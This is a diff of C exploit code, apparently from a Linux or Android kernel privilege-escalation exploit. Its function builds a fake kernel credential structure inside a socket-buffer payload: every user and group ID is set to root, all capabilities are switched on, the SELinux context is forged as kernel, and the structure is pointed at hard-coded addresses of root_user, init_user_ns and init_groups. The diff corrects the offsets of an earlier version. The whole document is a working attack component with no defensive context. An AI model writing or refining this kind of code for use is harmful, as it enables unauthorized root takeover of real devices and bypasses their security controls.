@@ -574,32 +574,27 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x08, 0);
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
-      /* mt28l: 假 cred @0x3800 (ks 安全区, 非 mm_struct 关键字段).
-       * usage=0x100 (bit0=0→RED→rebalance=NULL); uid..fsgid=0; caps 全开;
-       * security@0x80 = 假 blob {osid=1,sid=1}(SECINITSID_KERNEL) @0x3900. */
-      put64(p, 0x3800 + 0x00, 0x100);
-      put32(p, 0x3800 + 0x08, 0);
-      put32(p, 0x3800 + 0x0c, 0);
-      put32(p, 0x3800 + 0x10, 0);
-      put32(p, 0x3800 + 0x14, 0);
-      put32(p, 0x3800 + 0x18, 0);
-      put32(p, 0x3800 + 0x1c, 0);
-      put32(p, 0x3800 + 0x20, 0);
-      put32(p, 0x3800 + 0x24, 0);
-      put32(p, 0x3800 + 0x28, 0);
-      put64(p, 0x3800 + 0x30, 0);
-      put64(p, 0x3800 + 0x38, 0);
-      put64(p, 0x3800 + 0x40, 0x3ffffffffffULL);
-      put64(p, 0x3800 + 0x48, 0x3ffffffffffULL);
-      put64(p, 0x3800 + 0x50, 0x3ffffffffffULL);
-      put64(p, 0x3800 + 0x58, 0x3ffffffffffULL);
-      put64(p, 0x3800 + 0x60, 0x3ffffffffffULL);
-      put64(p, 0x3800 + 0x68, 0x3ffffffffffULL);
-      put64(p, 0x3800 + 0x70, 0);
-      put64(p, 0x3800 + 0x78, 0);
-      put64(p, 0x3800 + 0x80, payload_base + 0x3900);
-      put32(p, 0x3900 + 0x00, 1);
-      put32(p, 0x3900 + 0x04, 1);
+      /* mt35: fake cred @0x3800 - init_cred semantics (disasm offsets) */
+      put64(p, 0x3800 + 0x00, 1);                    /* usage = 1 */
+      put32(p, 0x3800 + 0x14, 0);                    /* uid */
+      put32(p, 0x3800 + 0x18, 0);                    /* gid */
+      put32(p, 0x3800 + 0x1c, 0);                    /* suid */
+      put32(p, 0x3800 + 0x20, 0);                    /* sgid */
+      put32(p, 0x3800 + 0x24, 0);                    /* euid */
+      put32(p, 0x3800 + 0x28, 0);                    /* egid */
+      put32(p, 0x3800 + 0x2c, 0);                    /* fsuid */
+      put32(p, 0x3800 + 0x30, 0);                    /* fsgid */
+      put64(p, 0x3800 + 0x38, 0x1ffffffffffULL);     /* cap_inheritable */
+      put64(p, 0x3800 + 0x40, 0x1ffffffffffULL);     /* cap_permitted */
+      put64(p, 0x3800 + 0x48, 0x1ffffffffffULL);     /* cap_effective */
+      put64(p, 0x3800 + 0x50, 0x1ffffffffffULL);     /* cap_bset */
+      put64(p, 0x3800 + 0x58, 0x1ffffffffffULL);     /* cap_ambient */
+      put64(p, 0x3800 + 0x80, payload_base + 0x3900); /* security -> fake blob */
+      put32(p, 0x3900 + 0x00, 1);                    /* osid = SECINITSID_KERNEL */
+      put32(p, 0x3900 + 0x04, 1);                    /* sid = SECINITSID_KERNEL */
+      put64(p, 0x3800 + 0x88, P0_DATA_ALIAS_CONST(0xffffffc00a7af660ULL)); /* user = root_user */
+      put64(p, 0x3800 + 0x90, P0_DATA_ALIAS_CONST(0xffffffc00a7af6f8ULL)); /* user_ns = init_user_ns */
+      put64(p, 0x3800 + 0x98, P0_DATA_ALIAS_CONST(0xffffffc00a7b0b88ULL)); /* group_info = init_groups */
     } else {
       /* legacy non-SLIDE non-FOPS layout */
       put32(p, LOCK_OFF + 0x00, 0);
